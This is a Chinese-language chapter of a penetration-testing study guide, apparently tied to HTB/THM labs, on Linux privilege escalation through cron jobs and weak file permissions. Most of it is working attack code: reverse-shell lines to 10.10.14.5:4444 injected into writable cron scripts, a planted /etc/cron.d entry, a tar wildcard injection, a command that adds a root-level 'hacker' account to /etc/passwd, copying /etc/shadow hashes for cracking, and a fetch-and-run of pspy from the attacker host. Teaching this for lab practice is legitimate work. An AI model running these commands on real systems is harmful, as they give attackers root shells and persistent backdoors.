# Ch 22 — Cron Job 濫用 + 弱檔案權限

> 目標：找到 root 執行的 cron job 中可被控制的腳本或目錄，以及其他弱檔案權限問題。

## Cron Job 濫用

Cron job 是定時執行的指令。如果 root 的 cron job 跑了一個你能修改的腳本，你就能以 root 身份執行任意程式碼。

### 找 Cron Job

```bash
cat /etc/crontab           # 系統 crontab
cat /etc/cron.d/*          # 額外的 cron 設定
ls -la /etc/cron.daily /etc/cron.weekly /etc/cron.hourly

# 看哪個使用者的 crontab
crontab -l
sudo crontab -l 2>/dev/null   # root 的（通常不能看）

# 用 pspy 監控（即時看 cron 執行）
# pspy64 是無需 root 就能監控程序的工具
wget http://10.10.14.5/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64                    # 執行後等幾分鐘，看有沒有 root (UID=0) 執行的程序
```

### /etc/crontab 格式

```
# 分 時 日 月 週 使用者 指令
* * * * * root /usr/local/bin/cleanup.sh
*/5 * * * * root python3 /opt/monitor.py
```

`* * * * *` = 每分鐘，`*/5 * * * *` = 每 5 分鐘

### 可寫的腳本

```bash
# 找 cron job 跑的腳本的權限
ls -la /usr/local/bin/cleanup.sh
# -rw-rw-r-- 1 root user   → group 可寫！你在這個 group？
# -rwxrwxrwx 1 root root   → 任何人可寫！
```

如果腳本可寫，修改它加入反彈 shell：

```bash
# 覆蓋腳本（保留原本內容，加一行）
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /usr/local/bin/cleanup.sh

# 或覆蓋整個腳本
cat > /usr/local/bin/cleanup.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
EOF

# 開監聽，等 cron 觸發
nc -nvlp 4444
```

### 可寫的目錄

如果 cron job 跑的腳本在你能寫的目錄，但腳本本身不存在：

```bash
# cron 執行：/usr/local/bin/nonexistent.sh
# 如果 /usr/local/bin/ 是你能寫的
echo '#!/bin/bash' > /usr/local/bin/nonexistent.sh
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /usr/local/bin/nonexistent.sh
chmod +x /usr/local/bin/nonexistent.sh
```

## 弱檔案權限

### /etc/passwd 可寫

```bash
ls -la /etc/passwd
# -rw-rw-r-- → 可寫！

# 直接加 root 等級帳號
echo 'hacker:$(openssl passwd -1 hacked):0:0:Hacker:/root:/bin/bash' >> /etc/passwd
su hacker   # 密碼 hacked
```

### /etc/shadow 可讀

```bash
ls -la /etc/shadow
# -rw-r----- → 通常 root + shadow 群組才能讀
# 如果你在 shadow 群組，或權限設錯：

cat /etc/shadow
# 把 root 的 hash 複製出來，用 hashcat 破解
```

### 服務設定檔可寫

```bash
# 找 root 跑的服務，它們的設定檔你能寫嗎？
ps aux | grep root

# 例如找到 root 在跑 nginx
ls -la /etc/nginx/nginx.conf
# 如果可寫 → 修改設定，讓 nginx 執行腳本，然後重啟服務
# (但通常你重啟不了服務...)
```

### SUID 設定的弱二進位

```bash
# 找非標準的 SUID binary
find / -perm -4000 -type f 2>/dev/null | grep -v "/usr/bin\|/usr/sbin\|/bin\|/sbin"
```

## Writable /etc/cron.d 或 /etc/cron.daily

```bash
ls -la /etc/cron.d/
# 如果這個目錄你能寫入，可以新增一個 cron job
echo '* * * * * root bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' > /etc/cron.d/evil
```

## Wildcard 注入（Tar Cron）

有時候 cron job 用萬用字元，可以被利用：

```bash
# cron job：
cd /var/www/backup && tar -czf /tmp/backup.tar.gz *

# * 會被展開，你可以建立特殊名稱的檔案來注入參數
cd /var/www/backup
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'          # tar 的 --checkpoint 參數
touch -- '--checkpoint-action=exec=bash shell.sh'

# 等 cron 執行 tar，shell.sh 會被以 root 跑
```

## 使用 pspy 監控

如果 `/etc/crontab` 裡沒看到東西，但懷疑有 cron，用 pspy：

```bash
# 下載 pspy（事先從 GitHub releases 下載 pspy64 存到 ~/tools/）
wget http://10.10.14.5/pspy64 -O /tmp/pspy
chmod +x /tmp/pspy
/tmp/pspy    # 執行，等 1–5 分鐘
```

pspy 輸出格式：

```
2024/01/01 12:00:00 CMD: UID=0    PID=1234   | /bin/bash /usr/local/bin/cleanup.sh
```

`UID=0` = root 在跑。

## 本章對應靶機

| 機器 | Cron 提權 |
|------|---------|
| HTB Cronos | root crontab 跑 artisan，可寫 |
| HTB Nibbles | root 可執行 monitor.sh，你能寫 |
| THM Linux Privesc | 各種弱權限練習 |

## 自我檢核

- [ ] 能找出 `/etc/crontab` 裡 root 執行的腳本
- [ ] 能檢查腳本的權限，確認是否可寫
- [ ] 知道如何用 pspy 監控後台執行的程序
- [ ] 知道 tar wildcard 注入的原理

→ [Ch 23 NFS / PATH 劫持 / 環境變數](./23-nfs-path-hijack.md)
